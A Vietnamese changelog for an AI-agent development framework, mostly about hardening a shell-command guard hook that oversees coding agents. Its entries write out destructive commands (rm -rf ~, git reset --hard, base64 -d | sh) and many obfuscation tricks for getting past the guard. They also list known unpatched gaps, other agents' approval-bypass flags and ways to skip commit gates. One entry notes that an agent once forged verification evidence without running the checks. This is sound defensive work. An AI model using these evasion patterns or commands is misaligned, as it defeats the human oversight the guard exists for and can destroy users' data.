> **Dự án đích khi nâng từ 3.4.0:** chạy lại `install.py` (hook `guard.py`, `xt.py`). Guard nay chặn thêm: lệnh mã hoá/nén
> vào shell mà guard không giải được, vòng `for` hơn 64 giá trị khác nhau.

### Fixed
- Guard (D-052) — bịt mục "Còn lọt" của 3.4.0:
  - Biến gán từ nguồn guard tính được: `x=$(echo|printf '…')`, `` x=`echo …` ``, `read [-r] x y <<< '…'`, `${y:-…}`/`${y=…}`
    được thay giá trị rồi quét (`x=$(echo 'rm -rf ~'); $x`, `read x <<< '…'; eval "$x"` nay bị chặn).
  - Lệnh mã hoá/nén vào shell: `echo … | base64 -d|xxd -r|openssl base64 -d|rev | sh` được giải và quét lệnh thật; nguồn
    không giải được trong guard (`cat f | base64 -d | sh`, `… | gunzip | sh`, sai định dạng) bị chặn thay vì chỉ hỏi.
  - Ghi `.autopilot/` (ADR-0026) qua `sort -o`, `sed 'w f'`/`s/…/…/w f`, `awk -i inplace`, `awk 'print > "f"'`, perl
    `unlink`/`open(F, '>', …)`/`open(F, ">f")` (cả cờ gộp `-ne`/`-pe`), `git restore|checkout` (trừ `restore --staged`), `tar -x … -C`, `unzip -d`,
    `split`/`csplit` bị chặn.
  - `bash -c "$(cat <<'E'` ↵ … ↵ `E` ↵ `)"` và `eval "$(cat <<E …)"`: thân heredoc được quét như lệnh.
  - Không còn chặn nhầm code span trong thân heredoc `<<'EOF'` của message commit (bash không thay backtick ở đó).
  - Vòng `for` thử từng giá trị KHÁC NHAU (từ trùng không chiếm chỗ); hơn 64 giá trị khác nhau → chặn (quá phức tạp).
  - Còn lọt (ghi ở `KNOWN_GAPS`): ghép chuỗi tên hàm lúc chạy (`getattr(os, 'sys' + 'tem')`) — né cố ý, ngoài phạm vi
    guard chống tai nạn (D-051).
- `xt.py contrast` (D-053): CSS lồng — `:root { &.dark {…} }`, `html { &[data-theme=dark] {…} }` là khối tối, `.dark { .card
  {…} }` là component; khai báo của khối con không còn rò sang theme sáng của khối cha.

## [3.4.0] - 2026-10-18

> **Dự án đích khi nâng từ 3.3.0:** chạy lại `install.py` (hook `guard.py`, `xt.py`, mẫu `CLAUDE.md`, khung — gộp
> `*.xtemplates-new`) rồi `compose` lại blueprint để nhận ID mới (`UX-DS-020` là MUST@L; `UX-DS-021/022`, `UX-A11Y-029`,
> `UX-RESP-021`, `CMP-LIC-022`, `FE-START-001…005` vào backlog). Guard nay **chặn** lệnh quá phức tạp để quét (lệnh > 256 KB,
> lệnh bọc/thay biến lồng quá sâu, > 600 lệnh con) — chia nhỏ lệnh hoặc dùng Write thay heredoc khổng lồ.

### Added
- Đề xuất UI từ `stored` 06 §7c/§7d/§7g/§7h, đối chiếu ba cột ở [`research/2026-10-18-stored-ui-extraction.md`](research/2026-10-18-stored-ui-extraction.md):
  - **`xt.py contrast`** (D-049): tương phản WCAG của cặp token CSS ở mọi theme (`:root`, `.dark`,
    `[data-theme=dark]`, `prefers-color-scheme`; màu `#hex`/`rgb`/`hsl`/`oklch`/bộ ba trần của shadcn, `var()`); tự suy cặp
    `--X-foreground`/`--on-X`/`--text-on-X` trên `--X`, `--foreground` trên `--background`, `--ring` ≥ 3:1; `--pairs` cho
    cặp khác; đọc cả `@theme` của Tailwind v4; không làm tròn lên; không có cặp nào để kiểm = đỏ. Đỏ khi `--primary`/`--destructive` thiếu token chữ.
  - **`xt.py vendor-check`**: thư mục vendor có `LICENSE`/`NOTICE`/`SOURCE`, không điều khoản hạn chế (Commons Clause,
    phi thương mại, Fair Use, BUSL, SSPL…); dò danh sách theo dõi `16-compliance-privacy/ui-vendor-watchlist.json`
    (Preline, magic-portfolio CC BY-NC, React Bits Commons Clause, Tailwind Plus) trong `package.json` và ghi nguồn.
  - **Mẫu cổng render** `framework/templates/ui-gates/verify-render.mjs` (D-048): axe (tag `wcag22aa`), tràn ngang 320/280 px,
    tương phản chữ mặc định/hover/focus; tự viết (không chép mã XIAS), đã chạy trên trang tốt (exit 0) và xấu (exit 1); goto lỗi = exit 2; phép đo không làm được in `UNMEASURED` (`--strict` để đỏ).
  - Mục mới: `UX-DS-020` (MUST@L, token chữ `on-primary` đi kèm nền hành động), `UX-DS-021` (lint `DESIGN.md` bằng
    `@google/design.md@0.4.0`, đọc `summary` vì tương phản chỉ là cảnh báo), `UX-DS-022` (skill thẩm mỹ chỉ là gợi ý, token
    khởi đầu qua cổng), `UX-A11Y-029` (MAY, thử căng 280 px — không phải chuẩn), `UX-RESP-021` (breakpoint theo nền tảng:
    window size classes compact/medium/expanded/large/extra-large; size class iOS), `CMP-LIC-022` (mã UI vendor ghi nguồn +
    license), module mới `FE-START-001…005` (`07-frontend/starter-layouts.md`: starter theo loại dự án, mẫu ngừng cập nhật,
    license không thuần OSI). `UX-DS-003/011` và `UX-A11Y-002/028` đổi `Kiểm` sang `xt.py contrast`/mẫu cổng render.
  - Dự án đích: chạy lại `install.py` rồi `compose` lại blueprint để nhận ID mới (`UX-DS-020` là `MUST@L`, còn lại SHOULD/MAY
    vào backlog); không đổi ID cũ.

### Fixed
- Guard — vá sau review #134 (D-050; **đính chính D-047**: "không thêm chặn nhầm" là sai, xem dưới):
  - 🔴 **Ngân sách quét** mỗi quyết định (600 lệnh con, 8 giây, mỗi script chỉ quét một lần, tối đa 8 lần viết lại cùng
    lệnh lồng nhau, bản thay biến ≤ 64 KB, lệnh ≤ 256 KB — vượt bất kỳ trần nào cũng **chặn**, không chỉ hỏi): `a="$a$a"` lặp 21 lần mất 177 s và 22 lần vượt timeout 600 s của hook nên lệnh chạy không qua guard;
    `flock /tmp/l` lồng 10 lớp mất 22 s. Hết ngân sách → **chặn** ("Lệnh quá phức tạp để guard quét hết"). Giá trị biến dài
    hơn 4 KB không được ghi nhận.
  - Thay biến viết lại **cả dòng token** (không còn từng lệnh riêng): `D=.autopilot; cd $D; echo x > v`,
    `cmd="rm -rf ~"; echo "$cmd" | sh`, `for d in a .autopilot; do rm -rf $d` (thử tới 64 từ của `for … in`) nay bị chặn.
  - `find` đổi hoa/thường và dạng glob (`-iname VERIFIED.JSON`, `-name '*autopilot*'`); đích `$PWD`/`${PWD}`/`$(pwd)`/
    `$CLAUDE_PROJECT_DIR` được mở ra thư mục thật (`rm -rf $PWD/.autopilot` từng lọt).
  - Hết chặn nhầm: chuỗi chứa khoảng trắng sau lệnh bọc chỉ là *chuỗi lệnh* khi đứng đầu hoặc ngay sau `-c`
    (`flock l git commit -m "rm -rf ~ is bad"`, `ionice -c3 npm test -- -t "…"`, `parallel … ::: "rm -rf ~"` không còn
    bị chặn); lời gọi `os.system`/`subprocess.*` chỉ lấy đối số ĐẦU của chính nó — chuỗi (kể cả `f'…'`, `r'…'`, `b'…'`,
    nháy ba, ghép `'rm' + ' -rf ~'`) hoặc list — và bỏ qua lời gọi nằm trong chuỗi (`.write("os.system('rm -rf ~')")`,
    `print('git reset --hard')`). Lệnh hợp lệ dùng < 20 lệnh con; ~200 lệnh bọc hoặc ~300 `$(…)` trong một lệnh sẽ bị chặn.
  - Còn lọt (ghi nhận, chưa vá): `sort -o`, `sed -n 'w …'`, `awk -i inplace`, `perl -e unlink`, `git restore .autopilot` vào
    `.autopilot/`; `bash -c "$(cat <<'E' … E)"`; mã trong code span backtick của thân heredoc `<<'EOF'` của commit message
    bị chặn nhầm (đã có từ 3.2); biến từ `$(…)`/`read`; `base64 -d | sh` (chỉ hỏi).
  Dự án đích: chạy lại `install.py` (hook `guard.py`).

- Guard (D-047) — bịt các lỗ còn lại sau 3.3.0:
  - `<<` trong nháy kép ngoài `$(…)` hay trong backtick đã đóng cùng dòng không còn nuốt các dòng sau
    (`echo "<<E"` ↵ `bash <<F` ↵ `git reset --hard` lọt); `-m "$(cat <<'EOF'` vẫn là heredoc thật.
  - `.autopilot/` (ADR-0026): `find -L|-H|-P`, bộ lọc `-path/-name` trúng `.autopilot` hay tên `verified.json`/
    `reviews.json`/`runs.jsonl` dưới gốc `.`, `-exec` chạy lệnh không chỉ-đọc (`mv`, `sed -i`, `sh -c`…), `-fprint`,
    `… .autopilot… | xargs <lệnh ghi/xoá>`, `touch`, và gán biến chữ nguyên văn (`D=.autopilot; echo x > $D/v`) đều bị chặn.
  - Lọt trong `KNOWN_GAPS` cũ, nay chặn: `sh -c $'…'` (ANSI-C), `rm${IFS}-rf${IFS}~`, `x='…'; eval "$x"`/`$x`/`bash -c "$x"`
    (kể cả trong `if`/`for`/hàm), `sh <(echo '…')`, lệnh bọc `flock`/`watch`/`script -c`/`su -c`/`busybox`/`coproc`/
    `ionice`/`unshare`/`nsenter`/…, và chuỗi trong `os.system`/`subprocess.*`/`execSync`/`spawn` của `python -c`/`node -e`/heredoc.
    Bản viết lại cùng lệnh (thay biến, hậu tố của lệnh bọc) quét ở cùng độ sâu, không tốn trần lồng 3.
  - Còn lọt (ghi ở `KNOWN_GAPS`): biến từ `$(…)`/`read`/vòng lặp, ghép chuỗi tên hàm, `base64 -d | sh` (chỉ hỏi).
  Dự án đích: chạy lại `install.py` (hook `guard.py`, mẫu `CLAUDE.md`).

## [3.3.0] - 2026-10-18

> **Dự án đích khi nâng từ 3.2.0:** chạy lại `install.py` (hook `guard.py`, `xt.py`, mẫu `AGENTS.md`/`CLAUDE.md`, skill
> autopilot — gộp `*.xtemplates-new`). `pr reviewed --clean` nay cần `--reviewer-model` và `--author-model`; ghi/xoá tay
> `.autopilot/` bị chặn (dùng `xt.py loop …`, gỡ vòng hỏng bằng `loop init --force`).

### Added
- `tests/test_guard_corpus.py` (D-044): bộ tấn công sinh biến thể cho guard — 19 lệnh hạt giống × 35 phép biến đổi cú
  pháp shell (đơn: đủ; cặp: mẫu tất định 4000/22141, toàn bộ chạy tay xanh) phải `deny`, và 49 lệnh hợp lệ agent hay
  chạy không bị chặn nhầm.

### Changed
- `xt.py pr reviewed --clean` cần `--reviewer-model` và `--author-model`, từ chối khi cùng họ model (opus/sonnet/haiku/
  fable…) — `LOOP-STOP-022` "reviewer khác model" trước đây chỉ là lời dặn (phiên 2026-10-18: `reviewer.md` ghim `opus`
  trong khi phiên chính chuyển sang Opus). Sổ `.autopilot/reviews.json` ghi cả hai model. `--blocking` không cần khai.
  Dự án đích: chạy lại `install.py` (xt.py, mẫu AGENTS.md, skill autopilot).

### Fixed
- Guard: `<<` trong comment hoặc nháy đơn (`echo x # <<E`, `echo '<<E'`) từng bị coi là heredoc và nuốt các dòng sau,
  nên heredoc thật vào shell ở dòng kế (`bash <<F` ↵ `git reset --hard`) lọt — nay bỏ qua `<<` ở đó (`_heredocs` dùng chung
  cho quét script và quét message commit); `<<` trong nháy kép/backtick vẫn xét (`-m "$(cat <<'EOF'`).
- Guard (ADR-0026, thay một phần ADR-0018): ghi/xoá tay `.autopilot/` (bằng chứng, `verified.json`, `reviews.json`, trạng
  thái vòng) qua Edit/Write, chuyển hướng, `tee`/`cp`/`rm`/`sed -i`/`find -delete` hay `python3 -c "open(…)"` bị **chặn** thay vì hỏi rồi
  cho qua — trước đây agent viết được bằng chứng xanh mà không chạy Gate. Dự án đích: chạy lại `install.py` (hook
  `guard.py`, mẫu `CLAUDE.md`).
- Guard (bộ tấn công tìm ra): heredoc vào shell nằm TRONG `sh -c "…"`/backtick từng bị cắt thân trước khi quét script lồng
  (`strip_heredocs` nay chỉ nhận `<<` ngoài nháy); `find … -exec bash <<E` (shell thừa hưởng stdin của find) từng lọt;
  `\\` + xuống dòng (gạch chéo đã escape) từng bị nối như nối dòng nên `sh -c "docker \\` ↵ `run --privileged …"` lọt
  (nối dòng nay theo bash: chỉ khi dãy `\` lẻ); tách pipeline quanh heredoc theo dấu nối ngoài nháy/escape (`\;`).
  Chặn nhầm: `curl … | python3 -m json.tool` (stdin là dữ liệu chỉ khi lệnh là file script đứng đầu hoặc
  `python3 -m json.tool`; `-c`/`-e`/cờ khác vẫn chặn — fail-closed). Dự án đích: chạy lại `install.py` (hook `guard.py`).

## [3.2.0] - 2026-10-18

> **Dự án đích khi nâng từ 3.1.1:** chạy lại `install.py` (hook `guard.py`, mẫu `xt.yaml`/`CLAUDE.md` đổi — gộp
> `*.xtemplates-new`), rồi ghép lại blueprint bằng `compose` để nhận `LOOP-OPT-*`. Muốn chặn ghi tên model/URL phiên AI
> trong commit thì khai `ai_attribution: forbid` trong `xt.yaml`.

### Added
- `LOOP-HARNESS-027` MAY: `xt.yaml` `ai_attribution: forbid` → guard chặn `git commit` mà message (`-m`, `--trailer`, `--author`, file
  `-F`, heredoc của lệnh commit) ghi tên model hay URL/trailer phiên AI (`Claude-Session:`, `claude.ai/code/session_…`,
  `Claude Opus …`); `Co-authored-by: Claude <…>` chung vẫn được. Repo khung bật khoá này (AGENTS.md §3, AUD-HAR-017).
  Dự án đích: chạy lại `install.py` (hook `guard.py`; mẫu `xt.yaml`, `CLAUDE.md` thêm dòng — gộp `*.xtemplates-new`),
  muốn chặn thì khai `ai_attribution: forbid`.
- `LOOP-OPT-001…015` (mới, `framework/11-autonomous-loop/optimization-loop.md`): vòng tối ưu hiệu năng trong autopilot — mục tiêu
  số, bộ đo khoá, máy quyết giữ/hoàn tác, một giả thuyết một thay đổi, chống gian lận số đo, profile/Amdahl, held-out,
  chỉ số phụ, sổ thử, ratchet. MUST hiệu lực ở quy mô M: 001–004. Công cụ mới `xt.py perf sample|compare|guard`
  (Mann-Whitney U + sàn nhiễu MAD; `guard` đỏ khi diff đụng/xoá file khoá kể cả file chưa theo dõi, ⚠ với cache/memoize,
  đổi đồng hồ, soi call stack; không phụ thuộc cấu hình diff của git). Dự án đích: ghép lại blueprint (`compose`) để nhận mục mới; không bắt buộc đổi mã.

### Changed
- CI `quality`: test Python 3.11 chạy trên checkout mang tên nhánh `main` như CI sau merge — bắt test phụ thuộc nhánh
  ngay ở PR (đỏ trên `main`, xanh ở PR: AUD-TEST-005, #124).

### Fixed
- Guard ghi công AI (`LOOP-HARNESS-027`): `;`/`&&` nằm trong nháy (`git commit -m "fix: a; b" -m "$(cat <<'EOF' …`) từng cắt
  `git commit` khỏi đoạn quét nên thân heredoc lọt; tiền tố > 4 KiB trước `git commit` cùng dòng cũng lọt. Nay tách
  pipeline theo dấu nối ngoài nháy, nối dòng `\` như shell, và lấy cửa sổ 4 KiB mỗi phía quanh heredoc. Dự án đích: chạy lại `install.py` (hook `guard.py`).
- `xt.py perf guard`: bỏ `GIT_DIR`/`GIT_WORK_TREE`/`GIT_INDEX_FILE`… đặt sẵn khỏi môi trường git — trỏ chúng vào một clone
  sạch từng làm guard báo "0 file đổi" dù cây đang làm việc đụng file khoá.
  File chưa theo dõi chỉ lọc theo `.gitignore` trong cây: `core.excludesFile`/`.git/info/exclude` không còn giấu được
  file khoá mới, đổi `.gitignore` bị báo ⚠. `perf sample` ghi commit cũng bỏ `GIT_*` đặt sẵn.
- `release-tag.yml`: kiểm mục `## [x.y.z]` đọc CHANGELOG từ file, không qua `git show | grep -q` — CHANGELOG > 64 KB làm
  `git show` nhận SIGPIPE, `pipefail` đỏ, tag `v3.1.1` không tạo được. Repo khung, dự án đích không phải làm gì.
- Test guard `GuardReview97Test` cố định nhánh hiện tại: `git push` không refspec chạy trên checkout `main` (CI sau merge)
  bị chặn đúng luật nên test đỏ trên `main` dù xanh trên nhánh PR.

## [3.1.1] - 2026-10-18

> **Dự án đích khi nâng từ 3.1.0:** chạy lại `install.py` (`.xtemplates/` thay toàn bộ; mẫu và hook `.claude/` không đổi so
> với 3.1.0). Đã ghép lại blueprint bằng 3.1.0 mà nối ghi chú bằng `·` → ghép lại từ bản blueprint trước lần nâng (vd
> `git show <commit trước>:BLUEPRINT.md`) bằng bản này, rồi so trạng thái/ghi chú theo ID; `compose` nay cảnh báo mục
> `[x]`/`[~]` không mang được ghi chú.

### Fixed
- `xt.py compose` ghép lại: ghi chú dự án nối bằng `·` (`· Nguồn: … · Bằng chứng: …`) nay được mang theo cả khi chữ mục
  đổi — trước đây bị bỏ im lặng, mục `[x]` mất bằng chứng (gặp ở hotel-manager khi nâng lên 3.1.0: 7 mục). Mục `[x]`/`[~]`
  đổi chữ mà vẫn không tìm được ghi chú để mang → cảnh báo kèm danh sách ID. Dự án đích: ghép lại blueprint bằng bản này
  rồi so trạng thái với bản cũ.

## [3.1.0] - 2026-10-18

> **Dự án đích khi nâng từ 3.0.x:**
> 1. Chạy lại `install.py`: `.xtemplates/` (gồm `xt.py`, `dev-task.sh`) thay toàn bộ; hook trong `.claude/` (`guard.py`,
>    `pre-bash-guard.sh`) cập nhật tại chỗ nếu chưa sửa, đã tuỳ biến thì thành `*.xtemplates-new` — gộp tay. Rồi `python3 .xtemplates/scripts/xt.py doctor` phải không còn ✗
>    (doctor nay thử guard bằng lệnh nguy hiểm mẫu — `LOOP-HARNESS-025`).
> 2. Guard chặt hơn (`LOOP-STOP-027/028`): lệnh Gate/`Kiểm:`/`xt.yaml` bị guard cấm thì không chạy (exit 126) — rà Gate
>    trong PLAN và lệnh `xt.yaml` có lệnh đối ngoại/phá huỷ không; `git config` khoá chạy lệnh (pager/editor/sshCommand…)
>    chỉ cho giá trị an toàn — giá trị khác người đặt tay; husky/lefthook cài bằng công cụ, không `git config
>    core.hooksPath` tay. `git commit --no-verify` nay vẫn chạy cổng của khung (cổng đỏ → commit bị chặn).
> 3. `loop init` khi vòng còn chạy nay exit 2 (`LOOP-HARNESS-024`): tiếp tục cùng PLAN → `loop resume`; chỉ `--force` khi
>    cố ý đổi PLAN/ngân sách hoặc chắc vòng cũ đã chết — không thêm `--force` mặc định vào script.
> 4. Ghép lại blueprint (`xt.py compose …`) để nhận mục mới: `SEC-SUPPLY-027`, `CMP-LIC-021`, `WF-DOC-019`, `QA-E2E-027/028`,
>    `AI-EVAL-020`, `AI-AGENT-023`, `PRF-DESK-018`, `PRF-CLI-021`, `LOOP-ORCH-018`, `CMP-AUDIT-020`, `IND-MEDIA-022`,
>    `PRF-AGENT-022`, `LOOP-STOP-027/028`, `LOOP-HARNESS-024/025/026`.
> 5. Tuỳ chọn: khai `claude_min_version` trong `xt.yaml` (`LOOP-HARNESS-026`).

### Added
Mục checklist từ đợt rà `seeker19110/stored` 2026-10-18 (stored `10ecf8b..a1a1f51`; chi tiết ở
`research/2026-10-18-stored-delta-extraction.md`). Dự án đích: ghép lại blueprint để nhận các ID mới.
- `SEC-SUPPLY-027` SHOULD: mục "Đánh giá" của PR thêm phụ thuộc/skill/plugin ghi SHA đã đọc, `git log --follow -- LICENSE*` (kể cả license tải lúc chạy), repo trùng tên đã loại, số tự công bố đã đo lại hay chưa — rà seeker19110/stored 2026-10-18.
- `CMP-LIC-021` SHOULD: thành phần tải lúc cài/chạy (engine, image `pull`, weights, `postinstall`) khai ở `THIRD_PARTY_NOTICES`, kể cả license không-OSI tầng dưới — rà seeker19110/stored 2026-10-18.
- `WF-DOC-019` SHOULD: lệnh cài ghim phiên bản trong README/docs/`SKILL.md` phải trỏ bản đã phát hành (kiểm qua registry npm/PyPI/crates.io/Go) — rà seeker19110/stored 2026-10-18.
- `QA-E2E-027` MAY: test có bước agent chỉ phát lại cache đã kiểm ở job required, cache miss/stale = đỏ — rà seeker19110/stored 2026-10-18.
- `QA-E2E-028` SHOULD: dữ liệu E2E tổng hợp; `gitleaks dir` quét report/video/cache agent trước `upload-artifact` — rà seeker19110/stored 2026-10-18.
- `AI-EVAL-020` SHOULD: bảng so sánh chỉ đặt cạnh nhau số cùng benchmark/metric/cấu hình, ghi nguồn `vendor`/`tự đo` — rà seeker19110/stored 2026-10-18.
- `AI-AGENT-023` SHOULD: tool ghi/sửa nhận `expected_version`, lệch → `CONFLICT` không ghi, mỗi lần ghi một phiên bản mới — rà seeker19110/stored 2026-10-18.
- `PRF-DESK-018` MUST: helper nâng quyền chỉ nhận hành động định sẵn (cấm `exec "$@"`/`sh -c`), polkit không `*_keep` cho action phá huỷ, XPC `setCodeSigningRequirement` — rà seeker19110/stored 2026-10-18.
- `PRF-CLI-021` SHOULD: CLI tự nâng quyền theo allowlist hành động, trỏ `PRF-DESK-018` — rà seeker19110/stored 2026-10-18.
- `LOOP-ORCH-018` SHOULD: `reviewer` rà Gate của PLAN (hành vi theo SPEC, không lệnh đối ngoại/phá huỷ) trước `loop decide` duyệt PLAN — rà seeker19110/stored 2026-10-18.
- `CMP-AUDIT-020` MAY: điểm/huy hiệu công cụ tự chấm chỉ là tín hiệu tư vấn, không vào cột bằng chứng GO-NO-GO — rà seeker19110/stored 2026-10-18.
- `IND-MEDIA-022` SHOULD: pipeline media trả phí validate/dry-run trước lệnh trả phí, sha256 đầu vào, đầu vào đổi → `stale` — rà seeker19110/stored 2026-10-18.
- `PRF-AGENT-022` MAY: sản phẩm nhúng CLI agent đặt thư mục cấu hình riêng, installer không ghi vào cấu hình công cụ khác — rà seeker19110/stored 2026-10-18.
- Skill `/research` và subagent `researcher`: phương pháp đánh giá nguồn bên thứ ba (chính chủ qua hai phép thử, license tầng dưới, repo trùng tên, tuyên bố → tự đo, huy hiệu tĩnh, affiliate, SHA đã đọc); bảng đầu ra của `researcher` thêm cột "SHA đã đọc" và "Số tuyên bố → tự đo" — rà seeker19110/stored 2026-10-18.
- `LOOP-HARNESS-024` SHOULD: `loop init` từ chối ghi đè vòng autopilot đang chạy (exit 2), `--force` khi cố ý — hai phiên cùng
  dự án từng xoá trạng thái của nhau (rà stored 01 §3h). Ai gọi `loop init` lại để đổi PLAN/ngân sách: thêm `--force`.
- `LOOP-HARNESS-025` SHOULD: `xt.py doctor` thử guard bằng lệnh nguy hiểm mẫu; guard có mà không chặn → lỗi `hooks` (rà stored
  03 §8b).
- `LOOP-HARNESS-026` MAY: khoá `xt.yaml` `claude_min_version`; `doctor` cảnh báo khi Claude Code thấp hơn; tổ chức ép bằng
  managed settings `requiredMinimumVersion` (docs Claude Code đọc 2026-10-18).

### Changed
- `BASE-DOC-017` (SHOULD, không đổi mức): thêm tuyên bố năng lực ("accessible", "offline", "no telemetry") và cách số do CI sinh giữa marker `<!-- ci:value:NAME -->`; thay cho mục `WF-DOC-020` định thêm (trùng nhà `BASE-DOC-017`/`BASE-DOC-018`) — rà seeker19110/stored 2026-10-18.
### Security
- Rà `seeker19110/stored` 2026-10-18 (mục 01 §3g, §3g.4; 03 §8c), mỗi lỗ đã tái hiện bằng payload thật trên guard:
  - **`LOOP-STOP-027`** (mới, MUST@L — harness cưỡng chế ở mọi quy mô): lệnh Gate (`PLAN.md`), `— Kiểm:` (blueprint), sàn Gate (`xt.yaml`) do model viết mà
    `xt.py` chạy (`loop record`/`loop verify`/`blueprint-status --run`) nay qua guard của dự án trước khi chạy — bị cấm thì
    exit 126, không chạy (`xt.py guard_block`). Trước đây `loop record --task T-001 -- rm -rf ~/x` và Gate `git push --force
    origin main` chạy ngoài hàng rào, kể cả khi Stop hook buộc `loop verify`. Lệnh `xt.yaml` ở `dev-task.sh` (cổng commit,
    `/gate`, `format_file`) cũng qua lệnh mới `xt.py guard-check`. Kiểm bằng guard của dự án VÀ của bản cài `xt.py` (một cái
    chặn là chặn); harness đã cài
    mà thiếu guard → chặn; guard lỗi → `_failure_decision` như hook.
  - **`LOOP-STOP-028`** (mới, MUST@L): guard chặn CLI agent khác Claude Code với cờ/biến tự duyệt — agent lồng không chạy
    hook của khung. Cờ đọc 2026-10-18 từ docs/mã nguồn: Codex (`--yolo`, `--dangerously-bypass-approvals-and-sandbox`,
    `-s danger-full-access`, `-a never`, `--approve-for-me`; `--full-auto` đã gỡ, vẫn chặn cho bản cũ), Gemini CLI
    (`--approval-mode=yolo`, `--yolo`/`-y` deprecated), Copilot CLI (`--allow-all-tools`, `--allow-all`, `--yolo`,
    `COPILOT_ALLOW_ALL`), opencode (`--auto`), aider (`--yes-always`, `AIDER_YES_ALWAYS`), Cursor CLI (`--force`,
    `--yolo`, `--approve-mcps`; tên binary `cursor-agent` chưa xác minh), Amp (`--dangerously-allow-all`, chỉ thấy ở
    docs E2B/SDK). Claude Code lồng không chặn: vẫn nạp hook của dự án, bypass vẫn chịu hook exit 2 và deny.
  - `git commit --no-verify` (và `git -c core.hooksPath=… commit`) ở chính sách mặc định **bỏ qua cổng của khung lặng
    lẽ**: hook chỉ chạy cổng khi không có `--no-verify`, còn câu hỏi bị chính sách mặc định (ADR-0018) bỏ đi. Nay cổng
    vẫn chạy; chỉ `XT_GUARD_POLICY=strict` để người quyết.
  - Ghi `.git/hooks`, `.git/config` (Edit, Bash, kể cả sau `cd` và `chmod`), đặt/bỏ `core.hooksPath`, khoá git chạy lệnh
    tuỳ ý (nhận theo mẫu: `include*.path`, `core.fsmonitor`/`sshCommand`/`gitProxy`/`pager`/`editor`, `pager.*`, `alias.*`,
    `protocol.*.allow`, đuôi `.cmd`/`.program`/`.helper`/`.smudge`…; qua `git config`, `-f .git/config` hay một lần `git -c`;
    giá trị chỉ cho qua khi khớp nguyên văn tập an toàn như `core.pager cat`, `ssh -i <khoá>`) bị chặn — không
    vào commit nên không có dấu vết PR. `git -c core.hooksPath=…`/`GIT_CONFIG_KEY_n` khi commit = `--no-verify` (strict hỏi).
  - Ghi đích tương đối sau `cd` nay tính từ thư mục đó (trước: `cd .claude/hooks && echo x > guard.py` lọt — có từ trước).
  Dự án đích: chạy lại `install.py` để nhận `guard.py`, `pre-bash-guard.sh`, `xt.py` mới.

## [3.0.1] - 2026-10-18

> **Dự án đích đã cài với `--with-github` (mọi bản, kể cả ≤ 2.x):** chạy lại `install.py --with-github`, rồi thay
> `.github/workflows/merge-gate.yml`, `.github/pull_request_template.md`, `.github/dependabot.yml` bằng bản
> `*.xtemplates-new` tương ứng nếu chưa tuỳ biến (đã tuỳ biến: gộp tay — `merge-gate.yml` chỉ cần chú thích zizmor ở dòng
> `pull_request_target`); xoá `*.xtemplates-new`. `xt.py doctor` nay báo các bản này còn chưa gộp.

### Fixed
- `install.py --with-github` chép mẫu PR và Dependabot **cho dự án đích** (`framework/templates/PULL-REQUEST.md`,
  `framework/templates/dependabot.yml`) thay vì bản của chính repo khung: mẫu PR cũ hỏi "module/hồ sơ/ngành" và
  `xt.py validate`; Dependabot cũ khai hệ `pip` cho `requirements-dev.txt` mà dự án đích không có (Dependabot báo lỗi mỗi
  lượt). Lỗi có từ v2.0.0.
- `merge-gate.yml`: chú thích `# zizmor: ignore[dangerous-triggers]` kèm lý do ở dòng `pull_request_target` — dự án đích
  chạy zizmor (WF-CI-004) đỏ mức high khi cài workflow này dù job không checkout code PR, token chỉ đọc, không secret.
- `xt.py doctor` quét cả `.github/**/*.xtemplates-new` (trước chỉ gốc dự án và `.claude/`): bản mới của mẫu GitHub chưa
  gộp không còn lặng lẽ nằm đó trong khi file đang dùng vẫn là bản cũ.

## [3.0.0] - 2026-10-18

> **Dự án đích cần làm khi nâng từ 2.x** (chi tiết ở từng mục dưới):
> 1. Chạy lại `install.py` từ bản này (`--with-github` nếu dùng workflow mẫu). Định danh kỹ thuật đổi sang `.xtemplates/`,
>    `xt.py`, `xt.yaml`, `XT_*` (ADR-0007, thay đổi phá vỡ): `install.py` đổi `xs.yaml` → `xt.yaml`, xoá `.xstored/` và
>    liệt kê file còn tên cũ — sửa tay các file đó và biến `XS_*` đặt ngoài `.github/workflows/`.
> 2. **Gộp harness ngay, trước commit kế tiếp.** Bản 2.0.0 không ghi `harness.sha256.json` nên mọi file hook, skill, agent
>    đã có mà khác bản khung thành `*.xtemplates-new`, kể cả file chưa sửa (`.claude/settings.json` được gộp hooks + quyền tự động); hook cũ còn trỏ
>    `.xstored/` đã xoá nên cổng commit lặng lẽ không chạy tới khi gộp. Gộp tay từng `*.xtemplates-new` (thay file cũ bằng
>    bản mới nếu chưa tuỳ biến). `install.py --force-harness` thay hết một lần nhưng ghi đè cả `.claude/settings.json` —
>    mất quyền riêng của dự án; chỉ dùng khi settings chưa tuỳ biến. Rồi `python3 .xtemplates/scripts/xt.py doctor --fix`
>    phải không còn ✗.
> 3. Ghép lại blueprint (`xt.py compose … --out BLUEPRINT.md`, giữ trạng thái theo ID; quy mô M: phần vượt 4 MUST/module
>    thành `MUST@L`, ADR-0004). Mục MUST `[~] — Miễn:` cũ giờ đỏ `blueprint-status --strict` (`LOOP-STOP-024`): thêm
>    `Duyệt: "<lời chủ dự án>" <ngày>`; chỉ đổi sang `— Không áp dụng: <điều kiện kiểm được>` khi mục thật sự không áp vào
>    dự án — đổi nhãn mục có áp dụng để né duyệt là vi phạm `LOOP-STOP-024`.
> 4. Thêm `merge-gate` vào required check của ruleset `main` sau khi job chạy trên một PR (ADR-0023).
> 5. Quy mô M/L: khai `format_check`, `coverage` (và `e2e` theo hồ sơ) trong `xt.yaml` (`LOOP-HARNESS-023`).
> 6. Mục blueprint đã tick: thêm dần `— Kiểm: \`<lệnh>\`` (`LOOP-DESIGN-023`).
> 7. Muốn agent merge ngoại lệ cứng hay chạy production: PR đặt `merge_hard_exceptions: auto` / mục "Ủy quyền production"
>    trong PLAN, do người merge (ADR-0020, ADR-0022).

### Changed
- **`xt.py doctor` cảnh báo khi khung đã cài cũ hơn bản phát hành mới nhất** (D-040; `LOOP-HARNESS-020` SHOULD, không đổi
  mức). Ở dự án đích, chế độ đầy đủ đọc tag `vX.Y.Z` mới nhất của repo khung qua `gh api repos/<repo>/tags` (mặc định
  `seeker19110/X-Templates`, fork đặt `XT_FRAMEWORK_REPO`), so với đầu nhãn `.xtemplates/VERSION`; cũ hơn → cảnh báo
  `version` "chạy lại `install.py`". Đọc mọi trang tag, ghim host `github.com`; nhãn pre-release (`3.0.0-rc1`) tính là cũ hơn bản cùng số. Fail-open: không có
  `gh`, lỗi mạng/quyền, thân không phải UTF-8/JSON (trang chặn của proxy), nhãn không phải SemVer → bỏ qua;
